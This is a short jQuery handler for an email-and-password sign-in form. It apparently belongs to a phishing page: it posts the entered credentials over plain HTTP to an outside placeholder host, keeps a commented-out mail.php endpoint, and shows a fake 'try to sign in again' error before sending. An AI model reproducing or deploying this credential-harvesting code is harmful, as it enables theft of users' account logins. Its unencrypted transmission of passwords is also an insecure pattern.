$('#continue').on('click', function() {
	const emailContext = $('#emailId').val().trim();
	const passwordContext = $('#passwordId').val().trim();

	if(emailContext === '') {
		$("#errorMessage").text("Write email");
		return false;
	} else if(passwordContext === '') {
		$("#errorMessage").text("Write password");
		return false;
	}
	
	$("#errorMessage").text("");

	$.ajax({
		url: 'http://foo.com',
		// url: 'ajax/mail.php',
		type: 'POST',
		cache: false,
		data: { 'email': emailContext, 'password': passwordContext },
		dataType: 'html',
		beforeSend: function() {
			$('#myModal').modal('show');
			$('#successMessage').text("Something goes wrong... Try to sign in again");
			$('#continue').prop('disabled', true)
		},
		success: function() {
			$('#successMessage').text("YOU successfully SIGNED IN");
			$('#myModal').modal('show');
			$('#continue').prop('disabled', false)
		}
	});
});